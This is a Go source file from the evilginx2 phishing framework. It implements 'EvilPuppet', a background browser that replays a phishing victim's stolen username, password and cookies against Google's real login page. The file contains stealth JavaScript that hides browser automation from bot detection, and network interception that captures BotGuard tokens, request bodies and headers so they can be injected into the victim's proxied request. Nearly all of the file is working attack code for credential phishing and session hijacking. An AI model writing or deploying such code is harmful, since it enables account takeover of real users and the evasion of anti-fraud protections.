package core

import (
	"context"
	"encoding/base64"
	"fmt"
	"net/url"
	"regexp"
	"strings"
	"sync"
	"time"

	"github.com/chromedp/cdproto/cdp"
	"github.com/chromedp/cdproto/dom"
	"github.com/chromedp/cdproto/fetch"
	"github.com/chromedp/cdproto/network"
	"github.com/chromedp/cdproto/page"
	"github.com/chromedp/chromedp"

	"github.com/kgretzky/evilginx2/log"
)

// EvilPuppetTrigger defines when evilpuppet should activate
type EvilPuppetTrigger struct {
	Domains     []string         // domains that trigger activation
	Paths       []*regexp.Regexp // path patterns that trigger activation
	ContentType string           // "json" or "post" - content type to match
}

// EvilPuppetAction defines a browser automation step
type EvilPuppetAction struct {
	Type     string // "navigate", "click", "type", "wait", "waitVisible", "waitLoad", "sleep", "javascript", "submit"
	Selector string // CSS selector for click/type/submit/waitVisible
	Value    string // URL for navigate, text for type, ms for sleep, script for javascript
}

// EvilPuppetInterceptor defines what network response to capture
type EvilPuppetInterceptor struct {
	Domain     string         // domain to intercept
	Path       *regexp.Regexp // path pattern to intercept
	TokenName  string         // name to store the captured token under
	Source     string         // "body", "header", "cookie"
	Search     *regexp.Regexp // regex to extract token value from source
	HeaderName string         // header name when Source is "header"
}

// EvilPuppetInjectToken defines how captured tokens are injected back into the victim's request
type EvilPuppetInjectToken struct {
	TokenName string
	Target    string         // "body"
	Search    *regexp.Regexp // regex to find stale token in request
	Replace   string         // replacement pattern with {token}
}

// EvilPuppetConfig is the runtime configuration for a phishlet's evilpuppet
type EvilPuppetConfig struct {
	Enabled      bool
	Triggers     []EvilPuppetTrigger
	Actions      []EvilPuppetAction
	Interceptors []EvilPuppetInterceptor
	StartURL     string                  // URL to navigate to initially
	Timeout      int                     // timeout in seconds for browser operations
	HoldRequest  bool                    // hold the triggering request until tokens are captured
	InjectTokens []EvilPuppetInjectToken // token injection rules
}

// EvilPuppetResult holds the result of an evilpuppet session
type EvilPuppetResult struct {
	Tokens map[string]string // captured tokens
	Error  error
}

// EvilPuppet manages background browser automation
type EvilPuppet struct {
	sync.RWMutex
	enabled        bool
	chromiumPath   string
	display        string // X11 display for headed mode (e.g., ":99")
	timeout        int    // default timeout in seconds
	debug          bool
	activeSessions map[string]context.CancelFunc // session_id -> cancel func
}

// NewEvilPuppet creates a new EvilPuppet instance
func NewEvilPuppet() *EvilPuppet {
	return &EvilPuppet{
		enabled:        false,
		chromiumPath:   "",
		display:        ":99",
		timeout:        30,
		debug:          false,
		activeSessions: make(map[string]context.CancelFunc),
	}
}

// Enable sets the enabled state
func (ep *EvilPuppet) Enable(enabled bool) {
	ep.Lock()
	defer ep.Unlock()
	ep.enabled = enabled
}

// IsEnabled returns whether evilpuppet is enabled
func (ep *EvilPuppet) IsEnabled() bool {
	ep.RLock()
	defer ep.RUnlock()
	return ep.enabled
}

// SetChromiumPath sets the path to chromium binary
func (ep *EvilPuppet) SetChromiumPath(path string) {
	ep.Lock()
	defer ep.Unlock()
	ep.chromiumPath = path
}

// SetDisplay sets the X11 display for headed mode
func (ep *EvilPuppet) SetDisplay(display string) {
	ep.Lock()
	defer ep.Unlock()
	ep.display = display
}

// SetTimeout sets the default timeout in seconds
func (ep *EvilPuppet) SetTimeout(timeout int) {
	ep.Lock()
	defer ep.Unlock()
	ep.timeout = timeout
}

// SetDebug sets debug mode
func (ep *EvilPuppet) SetDebug(debug bool) {
	ep.Lock()
	defer ep.Unlock()
	ep.debug = debug
}

// GetTimeout returns the default timeout
func (ep *EvilPuppet) GetTimeout() int {
	ep.RLock()
	defer ep.RUnlock()
	return ep.timeout
}

// CancelSession cancels an active evilpuppet session
func (ep *EvilPuppet) CancelSession(sessionId string) {
	ep.Lock()
	defer ep.Unlock()
	if cancel, ok := ep.activeSessions[sessionId]; ok {
		cancel()
		delete(ep.activeSessions, sessionId)
	}
}

// MatchTrigger checks if the request matches any evilpuppet trigger
func (ep *EvilPuppet) MatchTrigger(cfg *EvilPuppetConfig, host string, path string, contentType string) bool {
	if cfg == nil || !cfg.Enabled {
		return false
	}

	if strings.Contains(path, "batchexecute") {
		log.Warning("[evilpuppet-match] BATCHEXEC checking %d triggers, cfg.Enabled=%v, host=%s path=%s", len(cfg.Triggers), cfg.Enabled, host, path)
	}

	for i, trigger := range cfg.Triggers {
		domainMatch := false
		for _, d := range trigger.Domains {
			log.Debug("[evilpuppet-match] domain check: trigger_domain=%s vs request_host=%s", d, host)
			if d == host {
				domainMatch = true
				break
			}
		}
		if !domainMatch {
			if strings.Contains(path, "batchexecute") {
				log.Warning("[evilpuppet-match] [%d] BATCHEXEC domain MISMATCH: wanted=%v got=[%s]", i, trigger.Domains, host)
			}
			continue
		}

		pathMatch := false
		for _, p := range trigger.Paths {
			if p.MatchString(path) {
				pathMatch = true
				break
			}
		}
		if !pathMatch {
			if strings.Contains(path, "batchexecute") {
				log.Warning("[evilpuppet-match] [%d] BATCHEXEC path MISMATCH: path=%s", i, path)
			}
			continue
		}

		// Check content type if specified
		if trigger.ContentType != "" {
			ct := strings.ToLower(contentType)
			switch trigger.ContentType {
			case "json":
				if !strings.Contains(ct, "json") {
					continue
				}
			case "post":
				// Match any POST-like content type (form-urlencoded, multipart, or any non-empty content-type)
				if ct == "" {
					continue
				}
			}
		}

		return true
	}
	return false
}

// HandleTrigger spawns a background browser session and returns captured tokens
// victimCookies is the raw Cookie header from the victim's request (for session binding)
func (ep *EvilPuppet) HandleTrigger(sessionId string, cfg *EvilPuppetConfig, credentials map[string]string, phishDomain string, victimCookies string) <-chan *EvilPuppetResult {
	resultCh := make(chan *EvilPuppetResult, 1)

	go func() {
		defer close(resultCh)

		ep.RLock()
		chromiumPath := ep.chromiumPath
		display := ep.display
		timeout := ep.timeout
		debug := ep.debug
		ep.RUnlock()

		if cfg.Timeout > 0 {
			timeout = cfg.Timeout
		}

		result := &EvilPuppetResult{
			Tokens: make(map[string]string),
		}

		log.Info("[evilpuppet] [%s] Starting background browser session", sessionId)

		// Build chromedp options
		opts := append(chromedp.DefaultExecAllocatorOptions[:],
			chromedp.Flag("headless", false),
			chromedp.Flag("disable-gpu", false),
			chromedp.Flag("no-sandbox", true),
			chromedp.Flag("disable-dev-shm-usage", true),
			chromedp.Flag("disable-blink-features", "AutomationControlled"),
			chromedp.Flag("disable-infobars", true),
			chromedp.Flag("excludeSwitches", "enable-automation"),
			chromedp.Flag("enable-webgl", true),
			chromedp.Flag("use-gl", "desktop"),
			chromedp.Flag("disable-extensions", true),
			chromedp.Flag("disable-component-update", true),
			chromedp.Flag("disable-background-networking", true),
			// NOTE: Do NOT override User-Agent here — it creates a mismatch with
			// sec-ch-ua Client Hints (which cannot be overridden via --user-agent flag).
			// The browser's natural identity (Chromium on Linux) will be internally
			// consistent, and the BotGuard token will match the headers.
			chromedp.WindowSize(1920, 1080),
		)

		if chromiumPath != "" {
			opts = append(opts, chromedp.ExecPath(chromiumPath))
		}

		if display != "" {
			opts = append(opts, chromedp.Env("DISPLAY="+display))
		}

		// Create allocator context
		allocCtx, allocCancel := chromedp.NewExecAllocator(context.Background(), opts...)
		defer allocCancel()

		// Create browser context with timeout
		ctx, cancel := chromedp.NewContext(allocCtx,
			chromedp.WithLogf(func(format string, args ...interface{}) {
				if debug {
					log.Debug("[evilpuppet] [chromedp] "+format, args...)
				}
			}),
		)
		defer cancel()

		// Register cancellation
		ep.Lock()
		ep.activeSessions[sessionId] = cancel
		ep.Unlock()
		defer func() {
			ep.Lock()
			delete(ep.activeSessions, sessionId)
			ep.Unlock()
		}()

		// Set timeout
		ctx, timeoutCancel := context.WithTimeout(ctx, time.Duration(timeout)*time.Second)
		defer timeoutCancel()

		// Inject comprehensive stealth patches before any page JS runs
		stealthJS := `
			Object.defineProperty(navigator, 'webdriver', {get: () => undefined});
			window.chrome = {
				runtime: {},
				loadTimes: function() { return {}; },
				csi: function() { return {}; },
				app: {
					isInstalled: false,
					InstallState: {DISABLED:'disabled', INSTALLED:'installed', NOT_INSTALLED:'not_installed'},
					RunningState: {CANNOT_RUN:'cannot_run', READY_TO_RUN:'ready_to_run', RUNNING:'running'}
				}
			};
			const origQuery = window.navigator.permissions.query;
			window.navigator.permissions.query = (parameters) => (
				parameters.name === 'notifications' ?
					Promise.resolve({state: Notification.permission}) :
					origQuery(parameters)
			);
			Object.defineProperty(navigator, 'plugins', {
				get: () => {
					const p = [
						{name:'Chrome PDF Plugin', filename:'internal-pdf-viewer', description:'Portable Document Format', length:1},
						{name:'Chrome PDF Viewer', filename:'mhjfbmdgcfjbbpaeojofohoefgiehjai', description:'', length:1},
						{name:'Native Client', filename:'internal-nacl-plugin', description:'', length:1}
					];
					p.length = 3;
					return p;
				}
			});
			Object.defineProperty(navigator, 'languages', {get: () => ['en-US', 'en']});
			Object.defineProperty(navigator, 'hardwareConcurrency', {get: () => 4});
			Object.defineProperty(navigator, 'deviceMemory', {get: () => 8});
			delete window.__nightmare;
			delete window._selenium;
			delete window.callPhantom;
			delete window._phantom;
			delete window.domAutomation;
			delete window.domAutomationController;
			delete window.webdriver;
			const getParameter = WebGLRenderingContext.prototype.getParameter;
			WebGLRenderingContext.prototype.getParameter = function(parameter) {
				if (parameter === 37445) return 'Intel Inc.';
				if (parameter === 37446) return 'Intel Iris OpenGL Engine';
				return getParameter.call(this, parameter);
			};
			Object.defineProperty(window, 'outerWidth', {get: () => window.innerWidth});
			Object.defineProperty(window, 'outerHeight', {get: () => window.innerHeight + 85});
			Object.defineProperty(navigator, 'connection', {
				get: () => ({effectiveType: '4g', rtt: 100, downlink: 2.7, saveData: false})
			});
		`

		if err := chromedp.Run(ctx, chromedp.ActionFunc(func(ctx context.Context) error {
			_, err := page.AddScriptToEvaluateOnNewDocument(stealthJS).Do(ctx)
			return err
		})); err != nil {
			log.Warning("[evilpuppet] [%s] Failed to inject stealth patches: %v", sessionId, err)
		}

		// Captured tokens channel
		tokensCh := make(chan map[string]string, 1)
		capturedTokens := make(map[string]string)
		var tokensMtx sync.Mutex

		// Determine interception stages needed
		needsRequestStage := false
		needsResponseStage := false
		for _, ic := range cfg.Interceptors {
			if ic.Source == "request_body" {
				needsRequestStage = true
			} else {
				needsResponseStage = true
			}
		}

		// Set up network interception for token capture
		if len(cfg.Interceptors) > 0 {
			chromedp.ListenTarget(ctx, func(ev interface{}) {
				switch e := ev.(type) {
				case *fetch.EventRequestPaused:
					go func() {
						reqURL := e.Request.URL
						parsedURL, err := url.Parse(reqURL)
						if err != nil {
							c := chromedp.FromContext(ctx)
							if c != nil && c.Target != nil {
								fetch.ContinueRequest(e.RequestID).Do(cdp.WithExecutor(ctx, c.Target))
							}
							return
						}

						intercepted := false
						abortRequest := false

						// ═══ FULL BODY CAPTURE ═══
						// Capture the entire batchexecute body for full body swap
						// This is far more robust than individual token replacement
						if strings.Contains(reqURL, "batchexecute") && e.Request.HasPostData {
							postData := ""
							if len(e.Request.PostDataEntries) > 0 {
								for _, entry := range e.Request.PostDataEntries {
									if decoded, err := base64.StdEncoding.DecodeString(entry.Bytes); err == nil {
										postData += string(decoded)
									} else {
										postData += entry.Bytes
									}
								}
							}
							if strings.Contains(postData, "MI613e") {
								tokensMtx.Lock()
								capturedTokens["__full_body__"] = postData
								capturedTokens["__full_url__"] = reqURL

								// Capture cookies from request headers
								if cookieVal, ok := e.Request.Headers["Cookie"]; ok {
									if cookieStr, ok := cookieVal.(string); ok {
										capturedTokens["__full_cookies__"] = cookieStr
									}
								}

								// Capture User-Agent
								if uaVal, ok := e.Request.Headers["User-Agent"]; ok {
									if uaStr, ok := uaVal.(string); ok {
										capturedTokens["__full_useragent__"] = uaStr
									}
								}

								// Capture all headers
								var headerDump string
								for k, v := range e.Request.Headers {
									headerDump += fmt.Sprintf("%s: %v\n", k, v)
								}
								capturedTokens["__full_headers__"] = headerDump

								// Capture x-goog-ext-*, x-same-domain, and sec-ch-ua* headers
								for k, v := range e.Request.Headers {
									kLower := strings.ToLower(k)
									if strings.HasPrefix(kLower, "x-goog-ext-") || kLower == "x-same-domain" || strings.HasPrefix(kLower, "sec-ch-ua") {
										if vStr, ok := v.(string); ok {
											capturedTokens["__hdr_"+kLower+"__"] = vStr
											log.Info("[evilpuppet] [%s] Captured header %s = %s", sessionId, k, vStr)
										}
									}
								}

								log.Info("[evilpuppet] [%s] Captured full MI613e body (%d bytes), URL, cookies, headers", sessionId, len(postData))
								tokensMtx.Unlock()
							}
						}

						for _, ic := range cfg.Interceptors {
							domainMatch := ic.Domain == "" || ic.Domain == parsedURL.Host
							pathMatch := ic.Path == nil || ic.Path.MatchString(parsedURL.Path+parsedURL.RawQuery)

							if domainMatch && pathMatch {
								var tokenValue string

								if ic.Source == "request_body" {
									// Request-stage interception: extract from outgoing POST body
									postData := ""
									if e.Request.HasPostData && len(e.Request.PostDataEntries) > 0 {
										for _, entry := range e.Request.PostDataEntries {
											// CDP PostDataEntry.Bytes is base64-encoded
											if decoded, err := base64.StdEncoding.DecodeString(entry.Bytes); err == nil {
												postData += string(decoded)
											} else {
												// Fallback: might not be base64 in all cases
												postData += entry.Bytes
											}
										}
									}
									log.Debug("[evilpuppet] [%s] Intercepted POST body (%d bytes) for %s", sessionId, len(postData), parsedURL.Path)
									if ic.Search != nil && postData != "" {
										// Try matching on raw POST data first
										matches := ic.Search.FindStringSubmatch(postData)
										if len(matches) > 1 {
											tokenValue = matches[1]
										}
										// If no match on raw, try URL-decoded body
										if tokenValue == "" {
											decoded, err := url.QueryUnescape(postData)
											if err == nil && decoded != postData {
												matches = ic.Search.FindStringSubmatch(decoded)
												if len(matches) > 1 {
													tokenValue = matches[1]
													log.Debug("[evilpuppet] [%s] Token matched on URL-decoded body", sessionId)
												}
											}
										}
									}
									if tokenValue != "" {
										abortRequest = true
									}
								} else if ic.Source == "request_url" {
									// URL-stage interception: extract from request URL
									fullURL := e.Request.URL
									log.Debug("[evilpuppet] [%s] Checking URL for token: %s", sessionId, fullURL[:min(100, len(fullURL))])
									if ic.Search != nil {
										matches := ic.Search.FindStringSubmatch(fullURL)
										if len(matches) > 1 {
											tokenValue = matches[1]
											log.Debug("[evilpuppet] [%s] Token matched in URL: %s", sessionId, tokenValue[:min(30, len(tokenValue))])
										}
									}
									// Don't abort for URL capture, we only capture
								} else {
									// Response-stage interception: get response body
									resp, err := fetch.GetResponseBody(e.RequestID).Do(cdp.WithExecutor(ctx, chromedp.FromContext(ctx).Target))
									if err != nil {
										log.Debug("[evilpuppet] [%s] Failed to get response body: %v", sessionId, err)
										break
									}

									body := string(resp)

									switch ic.Source {
									case "body":
										if ic.Search != nil {
											matches := ic.Search.FindStringSubmatch(body)
											if len(matches) > 1 {
												tokenValue = matches[1]
											}
										} else {
											tokenValue = body
										}
									case "header":
										for _, h := range e.ResponseHeaders {
											if strings.EqualFold(h.Name, ic.HeaderName) {
												if ic.Search != nil {
													matches := ic.Search.FindStringSubmatch(h.Value)
													if len(matches) > 1 {
														tokenValue = matches[1]
													}
												} else {
													tokenValue = h.Value
												}
												break
											}
										}
									case "cookie":
										for _, h := range e.ResponseHeaders {
											if strings.EqualFold(h.Name, "Set-Cookie") {
												if ic.Search != nil {
													matches := ic.Search.FindStringSubmatch(h.Value)
													if len(matches) > 1 {
														tokenValue = matches[1]
													}
												}
											}
										}
									}
								}

								if tokenValue != "" {
									tokensMtx.Lock()
									capturedTokens[ic.TokenName] = tokenValue
									log.Success("[evilpuppet] [%s] Captured token: %s (%d bytes)", sessionId, ic.TokenName, len(tokenValue))
									// Check if all interceptors are satisfied
									allCaptured := true
									for _, icc := range cfg.Interceptors {
										if _, ok := capturedTokens[icc.TokenName]; !ok {
											allCaptured = false
											break
										}
									}
									if allCaptured {
										select {
										case tokensCh <- capturedTokens:
										default:
										}
									}
									tokensMtx.Unlock()
									intercepted = true
								}
							}
						}

						c := chromedp.FromContext(ctx)
						if c != nil && c.Target != nil {
							if abortRequest {
								// Abort the request to prevent token consumption at the real server
								fetch.FailRequest(e.RequestID, network.ErrorReasonAborted).Do(cdp.WithExecutor(ctx, c.Target))
								log.Debug("[evilpuppet] [%s] Aborted request: %s", sessionId, reqURL)
							} else if !intercepted {
								fetch.ContinueRequest(e.RequestID).Do(cdp.WithExecutor(ctx, c.Target))
							} else {
								fetch.ContinueRequest(e.RequestID).Do(cdp.WithExecutor(ctx, c.Target))
							}
						}
					}()
				}
			})

			// Enable fetch domain with appropriate patterns
			patterns := []*fetch.RequestPattern{}
			if needsRequestStage {
				patterns = append(patterns, &fetch.RequestPattern{
					URLPattern:   "*batchexecute*",
					RequestStage: fetch.RequestStageRequest,
				})
			}
			if needsResponseStage {
				patterns = append(patterns, &fetch.RequestPattern{
					URLPattern:   "*",
					RequestStage: fetch.RequestStageResponse,
				})
			}
			if len(patterns) == 0 {
				patterns = append(patterns, &fetch.RequestPattern{
					URLPattern:   "*",
					RequestStage: fetch.RequestStageResponse,
				})
			}

			if err := chromedp.Run(ctx, fetch.Enable().WithPatterns(patterns)); err != nil {
				log.Error("[evilpuppet] [%s] Failed to enable fetch interception: %v", sessionId, err)
			}
		}

		// ═══ COOKIE SYNCHRONIZATION ═══
		// Set victim's cookies in the browser BEFORE navigation
		// This ensures the BotGuard token is generated with the same session context
		if victimCookies != "" {
			log.Info("[evilpuppet] [%s] Syncing victim cookies to browser session", sessionId)

			// Parse cookie string: "name1=value1; name2=value2; ..."
			cookiePairs := strings.Split(victimCookies, ";")
			for _, pair := range cookiePairs {
				pair = strings.TrimSpace(pair)
				if pair == "" {
					continue
				}
				parts := strings.SplitN(pair, "=", 2)
				if len(parts) != 2 {
					continue
				}
				name := strings.TrimSpace(parts[0])
				value := strings.TrimSpace(parts[1])

				// Set cookie for Google domains
				domains := []string{".google.com", "accounts.google.com"}
				for _, domain := range domains {
					cookieParam := &network.CookieParam{
						Name:     name,
						Value:    value,
						Domain:   domain,
						Path:     "/",
						Secure:   true,
						HTTPOnly: false,
					}

					// Handle __Host- prefix cookies (require specific domain handling)
					if strings.HasPrefix(name, "__Host-") {
						cookieParam.Domain = "accounts.google.com"
						cookieParam.Path = "/"
					}

					err := chromedp.Run(ctx, chromedp.ActionFunc(func(ctx context.Context) error {
						return network.SetCookie(name, value).
							WithDomain(cookieParam.Domain).
							WithPath(cookieParam.Path).
							WithSecure(cookieParam.Secure).
							Do(ctx)
					}))
					if err != nil {
						log.Debug("[evilpuppet] [%s] Failed to set cookie %s: %v", sessionId, name, err)
					} else {
						log.Debug("[evilpuppet] [%s] Set cookie: %s (domain=%s)", sessionId, name, cookieParam.Domain)
					}
				}
			}
		} else {
			log.Warning("[evilpuppet] [%s] No victim cookies provided - token may not be bound to session", sessionId)
		}

		// Navigate to start_url before running actions
		if cfg.StartURL != "" {
			log.Info("[evilpuppet] [%s] Navigating to: %s", sessionId, cfg.StartURL)
			if err := chromedp.Run(ctx, chromedp.Navigate(cfg.StartURL)); err != nil {
				log.Error("[evilpuppet] [%s] Failed to navigate to start_url: %v", sessionId, err)
				result.Error = fmt.Errorf("navigation failed: %v", err)
				resultCh <- result
				return
			}

			// Wait for page to fully load
			if err := chromedp.Run(ctx, chromedp.ActionFunc(func(ctx context.Context) error {
				var readyState string
				for {
					if err := chromedp.Evaluate(`document.readyState`, &readyState).Do(ctx); err != nil {
						return err
					}
					if readyState == "complete" {
						return nil
					}
					select {
					case <-ctx.Done():
						return ctx.Err()
					case <-time.After(100 * time.Millisecond):
					}
				}
			})); err != nil {
				log.Warning("[evilpuppet] [%s] Page load wait interrupted: %v", sessionId, err)
			}
			log.Info("[evilpuppet] [%s] Page loaded successfully", sessionId)
		}

		// Run actions
		err := ep.runActions(ctx, sessionId, cfg.Actions, credentials, phishDomain)
		if err != nil {
			log.Error("[evilpuppet] [%s] Action execution failed: %v", sessionId, err)
			result.Error = err
			resultCh <- result
			return
		}

		// Wait for token capture or timeout
		if len(cfg.Interceptors) > 0 {
			select {
			case tokens := <-tokensCh:
				for k, v := range tokens {
					result.Tokens[k] = v
				}
				log.Success("[evilpuppet] [%s] All tokens captured successfully", sessionId)
			case <-ctx.Done():
				// Check if we captured any tokens before the timeout
				tokensMtx.Lock()
				for k, v := range capturedTokens {
					result.Tokens[k] = v
				}
				tokensMtx.Unlock()
				if len(result.Tokens) == 0 {
					result.Error = fmt.Errorf("timeout waiting for token capture")
					log.Warning("[evilpuppet] [%s] Timed out waiting for tokens", sessionId)
				} else {
					log.Warning("[evilpuppet] [%s] Timed out but captured %d/%d tokens", sessionId, len(result.Tokens), len(cfg.Interceptors))
				}
			}
		}

		resultCh <- result
	}()

	return resultCh
}

// runActions executes the sequence of browser actions
func (ep *EvilPuppet) runActions(ctx context.Context, sessionId string, actions []EvilPuppetAction, credentials map[string]string, phishDomain string) error {
	for i, action := range actions {
		// Replace placeholders in values
		value := ep.replacePlaceholders(action.Value, credentials, phishDomain)
		selector := ep.replacePlaceholders(action.Selector, credentials, phishDomain)

		log.Debug("[evilpuppet] [%s] Executing action %d: %s", sessionId, i+1, action.Type)

		var err error
		switch action.Type {
		case "navigate":
			err = chromedp.Run(ctx, chromedp.Navigate(value))
			if err == nil {
				log.Debug("[evilpuppet] [%s] Navigated to: %s", sessionId, value)
			}

		case "click":
			err = chromedp.Run(ctx, chromedp.Click(selector, chromedp.ByQuery))
			if err == nil {
				log.Debug("[evilpuppet] [%s] Clicked: %s", sessionId, selector)
			}

		case "type":
			err = chromedp.Run(ctx,
				chromedp.WaitVisible(selector, chromedp.ByQuery),
				chromedp.Clear(selector, chromedp.ByQuery),
				chromedp.SendKeys(selector, value, chromedp.ByQuery),
			)
			if err == nil {
				log.Debug("[evilpuppet] [%s] Typed into: %s", sessionId, selector)
			}

		case "wait":
			err = chromedp.Run(ctx, chromedp.WaitReady(selector, chromedp.ByQuery))
			if err == nil {
				log.Debug("[evilpuppet] [%s] Element ready: %s", sessionId, selector)
			}

		case "waitVisible":
			err = chromedp.Run(ctx, chromedp.WaitVisible(selector, chromedp.ByQuery))
			if err == nil {
				log.Debug("[evilpuppet] [%s] Element visible: %s", sessionId, selector)
			}

		case "waitLoad":
			err = chromedp.Run(ctx, chromedp.ActionFunc(func(ctx context.Context) error {
				// Wait for document.readyState to be 'complete'
				var readyState string
				for {
					if err := chromedp.Evaluate(`document.readyState`, &readyState).Do(ctx); err != nil {
						return err
					}
					if readyState == "complete" {
						return nil
					}
					select {
					case <-ctx.Done():
						return ctx.Err()
					case <-time.After(100 * time.Millisecond):
					}
				}
			}))

		case "sleep":
			var ms int
			_, parseErr := fmt.Sscanf(value, "%d", &ms)
			if parseErr != nil {
				ms = 1000 // default 1 second
			}
			select {
			case <-ctx.Done():
				return ctx.Err()
			case <-time.After(time.Duration(ms) * time.Millisecond):
			}
			log.Debug("[evilpuppet] [%s] Slept for %dms", sessionId, ms)

		case "javascript":
			var jsResult interface{}
			err = chromedp.Run(ctx, chromedp.Evaluate(value, &jsResult))
			if err == nil {
				log.Debug("[evilpuppet] [%s] Executed JavaScript", sessionId)
			}

		case "submit":
			err = chromedp.Run(ctx, chromedp.Submit(selector, chromedp.ByQuery))
			if err == nil {
				log.Debug("[evilpuppet] [%s] Submitted form: %s", sessionId, selector)
			}

		case "setAttribute":
			err = chromedp.Run(ctx, chromedp.SetAttributeValue(selector, "value", value, chromedp.ByQuery))
			if err == nil {
				log.Debug("[evilpuppet] [%s] Set attribute on: %s", sessionId, selector)
			}

		case "getText":
			var text string
			err = chromedp.Run(ctx, chromedp.Text(selector, &text, chromedp.ByQuery))
			if err == nil {
				log.Debug("[evilpuppet] [%s] Got text from %s: %s", sessionId, selector, text)
			}

		case "getHTML":
			var html string
			err = chromedp.Run(ctx, chromedp.ActionFunc(func(ctx context.Context) error {
				node, err := dom.GetDocument().Do(ctx)
				if err != nil {
					return err
				}
				html, err = dom.GetOuterHTML().WithNodeID(node.NodeID).Do(ctx)
				return err
			}))
			if err == nil {
				log.Debug("[evilpuppet] [%s] Got HTML (len=%d)", sessionId, len(html))
			}

		case "screenshot":
			// Take screenshot for debugging (stored in memory, logged)
			var buf []byte
			err = chromedp.Run(ctx, chromedp.CaptureScreenshot(&buf))
			if err == nil {
				log.Debug("[evilpuppet] [%s] Screenshot captured (%d bytes)", sessionId, len(buf))
			}

		default:
			log.Warning("[evilpuppet] [%s] Unknown action type: %s", sessionId, action.Type)
		}

		if err != nil {
			return fmt.Errorf("action %d (%s) failed: %v", i+1, action.Type, err)
		}
	}
	return nil
}

// replacePlaceholders replaces template variables in action values
func (ep *EvilPuppet) replacePlaceholders(s string, credentials map[string]string, phishDomain string) string {
	s = strings.ReplaceAll(s, "{username}", credentials["username"])
	s = strings.ReplaceAll(s, "{password}", credentials["password"])
	s = strings.ReplaceAll(s, "{phish_domain}", phishDomain)
	for k, v := range credentials {
		s = strings.ReplaceAll(s, "{custom:"+k+"}", v)
	}
	return s
}

// Shutdown cancels all active sessions
func (ep *EvilPuppet) Shutdown() {
	ep.Lock()
	defer ep.Unlock()
	for sid, cancel := range ep.activeSessions {
		log.Debug("[evilpuppet] Cancelling session: %s", sid)
		cancel()
	}
	ep.activeSessions = make(map[string]context.CancelFunc)
}

// ActiveSessionCount returns the number of active evilpuppet sessions
func (ep *EvilPuppet) ActiveSessionCount() int {
	ep.RLock()
	defer ep.RUnlock()
	return len(ep.activeSessions)
}

// Suppress unused import warnings
var _ = network.Enable
